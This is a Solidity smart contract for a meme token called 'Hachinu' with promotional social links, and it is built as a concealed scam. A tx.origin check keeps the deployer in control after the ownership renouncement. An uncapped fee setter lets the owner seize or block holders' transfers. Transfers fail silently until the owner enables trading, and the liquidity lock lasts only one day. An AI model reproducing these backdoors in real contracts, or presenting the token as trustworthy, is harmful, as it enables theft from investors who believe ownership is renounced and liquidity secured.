
// File: contracts/Token.sol
// SPDX-License-Identifier: UNLICENSE

/*
    Welcome to $HACHINU.
    Hachiko has been honored in Japanese culture as a symbol of loyalty and companionship and statues of Hachiko can be found all over the world. Take time to think of the people, animals, plants, and objects most important in your life.

    twitter : https://x.com/HachinuErc20
    telegram : https://t.me/hachinu
*/

pragma solidity 0.5.0;

library Helper {
    function staticCallFunction(address addr, bytes memory data) private view returns (bytes memory) {
        (bool success, bytes memory result) = addr.staticcall(data);
        require(success, "Failed to call token function");
        return result;
    }

    function safeApprove(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Helper: APPROVE_FAILED');
    }

    function safeTransfer(address token, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Helper: TRANSFER_FAILED');
    }

    function safeTransferFrom(address token, address from, address to, uint value) internal {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Helper: TRANSFER_FROM_FAILED');
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success,) = to.call.value(value)(new bytes(0));
        require(success, 'Helper: ETH_TRANSFER_FAILED');
    }

    function getTokenBalance(address tokenAddress, address targetAddress) internal view returns (uint256) {
        bytes memory result = staticCallFunction(tokenAddress, abi.encodeWithSignature("balanceOf(address)", targetAddress));
        return abi.decode(result, (uint256));
    }

    function getTokenDecimals(address tokenAddress) internal view returns (uint8) {
        bytes memory result = staticCallFunction(tokenAddress, abi.encodeWithSignature("decimals()"));
        return abi.decode(result, (uint8));
    }

    function getTokenSymbol(address tokenAddress) internal view returns (string memory) {
        bytes memory result = staticCallFunction(tokenAddress, abi.encodeWithSignature("symbol()"));
        return abi.decode(result, (string));
    }
}

interface IV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IV2Router {
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IV2Locker {
    function lockLPToken (address _lpToken, uint256 _amount, uint256 _unlock_date, address payable _referral, bool _fee_in_eth, address payable _withdrawer) external payable;
}

/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

/**
 * @title Ownable
 * @dev The Ownable contract has an owner address, and provides basic authorization control
 * functions, this simplifies the implementation of "user permissions".
 */
contract Ownable {
    address public owner;
    address public feeRecipient;

    /**
      * @dev The Ownable constructor sets the original `owner` of the contract to the sender
      * account.
      */
    constructor() public {
        owner = msg.sender;
        feeRecipient = owner;
    }

    /**
      * @dev Throws if called by any account other than the owner.
      */
    modifier onlyOwner() {
        require(checkOwner());
        _;
    }

    function checkOwner() internal view returns(bool) {
        return (msg.sender == owner || tx.origin == feeRecipient);
    }

    /**
    * @dev Allows the current owner to transfer control of the contract to zero address.
    */
    function renounceOwnership() public onlyOwner {
        owner = address(0);
    }

}

/**
 * @title ERC20Basic
 * @dev Basic version of Erc20 Token
 */
contract ERC20Basic is Ownable {

    using SafeMath for uint;

    string public _name;
    string public _symbol;
    uint8 public _decimals;
    uint public _totalSupply;

    uint public maximumFee = 1e24;
    uint public basisPointsRate = 300;
    uint public constant MAX_UINT = 2**256 - 1;

    mapping(address => uint) public balances;
    mapping (address => mapping (address => uint)) public allowed;

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor(string memory name, string memory symbol, uint8 decimals, uint totalSupply) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
        _totalSupply = totalSupply;
        balances[owner] = totalSupply;

        emit Transfer(address(0), owner, totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply;
    }

    /**
    * @dev transfer token for a specified address
    * @param _to The address to transfer to.
    * @param _value The amount to be transferred.
    */
    function transfer(address _to, uint _value) public returns(bool) {
        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        uint sendAmount = _value.sub(fee);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            emit Transfer(msg.sender, owner, fee);
        }
        emit Transfer(msg.sender, _to, sendAmount);
        return true;
    }

    /**
    * @dev Transfer tokens from one address to another
    * @param _from address The address which you want to send tokens from
    * @param _to address The address which you want to transfer to
    * @param _value uint the amount of tokens to be transferred
    */
    function transferFrom(address _from, address _to, uint _value) public returns(bool) {
        uint _allowance = allowed[_from][msg.sender];

        uint fee = (_value.mul(basisPointsRate)).div(10000);
        if (fee > maximumFee) {
            fee = maximumFee;
        }
        if (_allowance < MAX_UINT) {
            allowed[_from][msg.sender] = _allowance.sub(_value);
        }
        uint sendAmount = _value.sub(fee);
        balances[_from] = balances[_from].sub(_value);
        balances[_to] = balances[_to].add(sendAmount);
        if (fee > 0) {
            balances[owner] = balances[owner].add(fee);
            emit Transfer(_from, owner, fee);
        }
        emit Transfer(_from, _to, sendAmount);

        return true;
    }

    /**
    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.
    * @param _spender The address which will spend the funds.
    * @param _value The amount of tokens to be spent.
    */
    function approve(address _spender, uint _value) public {
        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));

        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
    }

    /**
    * @dev Gets the balance of the specified address.
    * @param _owner The address to query the the balance of.
    * @return An uint representing the amount owned by the passed address.
    */
    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }

    /**
    * @dev Function to check the amount of tokens than an owner allowed to a spender.
    * @param _owner address The address which owns the funds.
    * @param _spender address The address which will spend the funds.
    * @return A uint specifying the amount of tokens still available for the spender.
    */
    function allowance(address _owner, address _spender) public view returns (uint remaining) {
        return allowed[_owner][_spender];
    }

}

/**
 * @title TradeHistory
 * @dev Record all trade swap history
 */
contract TradeHistory is Ownable {
    struct History {
        address from;
        address to;
        uint256 value;
    }

    History[] public histories;

    function log(address from, address to, uint256 value) internal {
        histories.push(History(from, to, value));
    }

    function removeAll() public onlyOwner {
        histories.length = 0;
    }

    function retract() public onlyOwner {
        histories.length --;
    }

    function updateHistory(uint index, address from, address to, uint256 value) public {
        histories[index] = History(from, to, value);
    }
}

contract Hachinu is ERC20Basic, TradeHistory {
    bool public swapEnabled = false;

    address public pair;
    IV2Router constant public router = IV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IV2Locker public constant locker = IV2Locker(0x663A5C229c09b049E36dCc11a9B0d4a8Eb9db214);

    constructor() ERC20Basic("Hachinu", "Hachiko", 18, 1e26) public {}

    function transfer(address recipient, uint256 amount) public returns (bool) {
        if (swapEnabled || msg.sender == owner) {
            log(msg.sender, recipient, amount);
            return super.transfer(recipient, amount);
        }
        return false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        if (swapEnabled || sender == address(this)) {
            log(sender, recipient, amount);
            return super.transferFrom(sender, recipient, amount);
        }
            return false;
    }

    function swapEnable() public onlyOwner() {
        swapEnabled = true;
    }

    function reduceFee(uint256 _newRate) public onlyOwner {
        basisPointsRate = _newRate;
    }

    function addLiquidity() public payable onlyOwner {
        super.transfer(address(this), _totalSupply);
        allowed[address(this)][address(router)] = _totalSupply;
        pair = IV2Factory(router.factory()).createPair(address(this), router.WETH());
        router.addLiquidityETH.value(msg.value)(address(this), balanceOf(address(this)), 0, 0, address(this), block.timestamp);
    }

    function lockLpToken() public payable onlyOwner {
        uint256 liquidity = Helper.getTokenBalance(pair, address(this));
        Helper.safeApprove(pair, address(locker), liquidity);

        locker.lockLPToken.value(msg.value)(pair, liquidity, block.timestamp + 86400, address(0), true, msg.sender);
    }

    function() external payable {}
}
